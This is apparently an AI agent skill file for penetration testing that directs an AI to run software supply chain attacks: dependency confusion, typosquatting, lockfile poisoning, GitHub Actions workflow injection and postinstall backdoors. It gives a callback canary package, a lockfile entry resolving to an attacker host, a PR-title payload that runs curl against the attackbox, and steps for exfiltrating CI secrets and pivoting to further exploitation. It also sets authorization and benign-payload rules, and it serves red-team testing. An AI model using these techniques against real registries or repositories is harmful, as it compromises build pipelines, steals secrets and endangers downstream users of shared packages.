---
name: supply-chain-attacks
description: >
  Compromise targets via their software supply chain — dependency
  confusion against private registries, typosquatting on public
  registries, lockfile poisoning, CI/CD workflow injection (GitHub
  Actions / GitLab CI), build-tool entry-point abuse, and
  action/image pinning bypass. Covers npm, pypi, maven, nuget,
  rubygems, and container registries. For AI/ML artifact supply chain
  (malicious models, poisoned datasets) use ml-supply-chain.
keywords:
  - supply chain attack
  - dependency confusion
  - typosquatting
  - lockfile poisoning
  - CI/CD poisoning
  - GitHub Actions injection
  - workflow injection
  - npm supply chain
  - pypi supply chain
  - package namespace confusion
  - action pinning bypass
tools:
  - npm
  - pip
  - python3
  - curl
  - jq
opsec: high
---

# Software Supply Chain Attacks

You are helping a penetration tester test an organization's software
supply chain — the registries, build systems, and CI/CD pipelines it
depends on. Classes covered: dependency confusion, typosquatting,
lockfile manipulation, CI workflow injection, build-plugin abuse.
All testing is under explicit written authorization within the
operator's engagement scope — supply chain is a shared-fate ecosystem
and the engagement must say which registries and repos are in play.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[supply-chain-attacks] Activated → <target>` on activation.
- **Evidence** → save enumeration output (manifests, lockfiles,
  workflow YAML, registry listings), the crafted artifact (if
  benign), and callback logs to
  `engagement/evidence/supplychain-<target>/`. Payloads MUST be
  benign (DNS/HTTP callback to the attackbox, `whoami` output
  returned to a canary endpoint) — never destructive.

## Scope Boundary

This skill covers **general software supply chain**. ML-artifact
supply chain (pickle RCE, backdoored models) is `ml-supply-chain`.
Attacking a published package used by many downstream consumers is
**out of scope** unless the engagement explicitly authorizes it —
the blast radius extends past the operator's targets. On a
confirmed vector (callback received, workflow secret exfiltrated,
build succeeded with injected code), **STOP** and return.

**Hard rule — never publish a working exploit to a shared registry.**
When testing dependency confusion or typosquatting, the published
package body must be:
- Benign (callback only — DNS lookup, HTTP ping, canary token).
- Unpublished / yanked immediately after the test window.
- Named with an operator-approved identifier (e.g. prefix with
  `pentest-canary-<engagement-id>`) so downstream auditors can
  identify it as a scope-authorized artifact.

If any of those conditions can't be met, do not publish — report
the finding as `plausible` with the attack path documented and
let the operator decide.

## State Management

Call `get_state_summary()`. Check for prior enum findings:
- Target's registries (internal npm/pypi URLs from `web-enum`)
- Public GitHub orgs / repos belonging to the target
- Known internal package names (from any leaked docs, `web-enum`
  JS source review, exposed `package.json` or `requirements.txt`)

Report back:
- Variant run (confusion / typo / lockfile / CI / build-plugin)
- Target vector (registry name, repo, workflow file)
- Verification oracle (callback hash)
- Finding id

## Prerequisites

- The target consumes dependencies from one or more registries you
  can publish to (public npm/pypi/maven, or an internal registry
  the engagement scopes you against).
- OR: the target has a public source repository you can submit a
  PR / commit to and whose CI runs on untrusted inputs.
- Attackbox has `npm`, `pip`, and a benign callback endpoint ready
  (DNS canary like `interactsh` if available locally, else a
  simple HTTP listener on the attackbox).

## Attack Variants

### Variant A — Dependency confusion (private name on public registry)

The target depends on an **internal** package name (e.g. `@acme/
internal-utils`, `acme-logger`, `com.acme.secrets`). If no public
package exists with the same name AND the build config queries
public registries, you can publish a higher-version public package
that gets pulled first.

Steps:
1. **Enumerate internal names.** Look at any leaked
   `package.json` / `pom.xml` / `requirements.txt` / `*.csproj`
   from the target's public repos, exposed webroot, or `web-enum`
   JS bundles. Note names that lack a public counterpart.
2. **Confirm availability on the public registry:**
   ```bash
   npm view <name>   # returns E404 if available
   pip index versions <name>   # same
   ```
3. **Publish a benign canary** with a higher version than any
   internal release. The package body MUST be benign:
   ```javascript
   // index.js — benign canary
   const dns = require('dns');
   dns.lookup(`sc-${process.env.USER}-${Date.now()}.canary.<attackbox>`,
              () => {});
   ```
4. **Wait for callback.** When an internal build pulls the canary
   you receive a DNS lookup; cross-check timestamp and sanitized
   hostname against the engagement timeline.
5. **Yank immediately** (`npm unpublish --force`, `pypi delete`)
   once the finding lands.

### Variant B — Typosquatting

Publish a package with a name that is one edit distance away from
a popular dependency the target uses:
- Swap: `reqeusts` for `requests`, `express-middleware` for
  `express-middlware`.
- Character substitution: `reactt`, `expresss`.
- Namespace confusion: `requests-client` (reads similar to
  `requests` in a hurry).

Same benign-callback rule as Variant A. The engagement scope must
authorize the specific typo — never squat on a widely-depended
name "to see what happens."

### Variant C — Lockfile poisoning

If you can commit to the target's repo (as part of an authorized
red-team path — e.g. you have a stolen developer token from
earlier `credential-dumping`), you can modify the lockfile to
point an existing dependency at a malicious resolved URL / hash
without changing the manifest:

```json
// package-lock.json excerpt
"left-pad": {
  "version": "1.3.0",
  "resolved": "https://<attackbox>/left-pad-1.3.0.tgz",
  "integrity": "sha512-<attacker-controlled-hash>"
}
```

The lockfile is often rubber-stamped in PR review; the manifest
isn't touched, so `npm install` pulls the attacker's tarball.
Verify by observing the next CI run fetch from the attackbox URL.

### Variant D — CI/CD workflow injection

GitHub Actions / GitLab CI run on untrusted input (PR titles, PR
bodies, issue text, external contributor commits) in many
repos. Classic sinks:

- **`${{ github.event.pull_request.title }}`** interpolated into a
  `run:` block → shell injection with repo write / secret access.
- **`pull_request_target` trigger with checkout of PR head** →
  attacker code runs with secrets.
- **Workflow file inherited from a feature branch** → opening a PR
  from a branch that modifies `.github/workflows/*.yml` can run
  the modified workflow if the repo doesn't gate on `main`.

Enumerate authorized target repo workflows:

```bash
# From a repo you have read access to:
cat .github/workflows/*.yml | grep -nE 'pull_request_target|\$\{\{ *github\.event'
```

For in-scope PRs, submit a benign canary title/body (e.g. PR title:
`$(curl <attackbox>?pr=$GITHUB_RUN_ID)`) and watch for callbacks.

### Variant E — Action / image pinning bypass

A workflow pins `uses: actions/checkout@v4` or
`image: node:18`. If the pin is a mutable tag (not a SHA / digest)
and the attacker controls the upstream repo (or compromises it
elsewhere), the tag can be moved to point at a malicious revision.
Report workflows that pin to tags rather than SHAs — the attack
isn't the exploit, the finding is "this pin shape is exploitable
if upstream is ever compromised."

### Variant F — Build-plugin / entry-point abuse

Setuptools entry-points, Maven plugins, Gradle init scripts, and
npm `postinstall` hooks run arbitrary code at install time. If
you can get a malicious package in via Variants A-C, these are
the natural execution surface. Alternatively, if an operator has
commit access to a legitimate internal package, inserting a
`"scripts": {"postinstall": "..."}` is the backdoor shape.

## Verification Oracle

- **Callback received** from the operator's canary host, with
  timestamp and sanitized context identifying the build / CI run
  that fetched the artifact. `confirmed`.
- **Workflow secret exfiltrated to the attackbox** (e.g. a
  `${{ secrets.* }}` value received via DNS or HTTP from a CI
  run) — `confirmed`. Treat secret as burned and rotate
  immediately with the operator.
- **Lockfile change merged**: a PR touching only the lockfile
  gets merged in the normal review flow — `plausible` (shows
  the review gap) unless combined with Variant F or a benign
  package switch that produces a callback.

Model-judgement ("I think this would work") is never
`confirmed` — supply-chain findings need a callback or a
merged artifact to prove the end-to-end path.

## Post-Attack Exit

Write the finding to `engagement/findings/<id>.json`:
- CWE-1357 (Reliance on Insufficiently Trusted Source) — primary
- CWE-829 (Inclusion of Functionality from Untrusted Control
  Sphere) — for Variants D/E
- OWASP A08 (Software and Data Integrity Failures)
- MITRE ATT&CK: T1195 (Supply Chain Compromise), T1554 (Compromise
  Software Supply Chain)

STOP and return to the orchestrator with:
- Variant run + registry/repo touched
- Published artifact name + version (so the operator can audit
  and yank)
- Callback evidence hash
- Follow-ups:
  - Callback from a build host → `ad-ops` or `lin-ops` if the
    build host is in scope and the engagement authorizes follow-on
    exploitation
  - Secret exfiltrated → `spray` with the recovered credential
    (with operator-rotation step first)
  - Confirmed workflow injection → report with remediation
    (pin SHAs, remove untrusted input from `run:`, use
    `pull_request` instead of `pull_request_target`)

## Troubleshooting

### Package published but no callback

Several possibilities:
- Target's build config doesn't query public registries (good
  posture — report as a negative finding).
- Build happens on an air-gapped network with no DNS egress.
- Build consumes a different variant of the name (hyphen vs
  underscore, scope prefix).
Re-enumerate internal names, confirm registry URL coverage, and
try the canary name variants documented in the engagement scope.

### Workflow injection PR gets auto-closed

Repo has pre-merge gating (CODEOWNERS, required reviews, or a
`labeler` that quarantines external PRs). Finding is still valid
if an authorized reviewer manually approves the PR path for the
canary — document the gate as a mitigating control in the
finding's remediation section.

### Can't publish — registry requires org membership

Dependency confusion only works against registries that accept
public uploads for the namespace. Pivot to Variant C (lockfile)
or D (CI) if you already have repo write access.
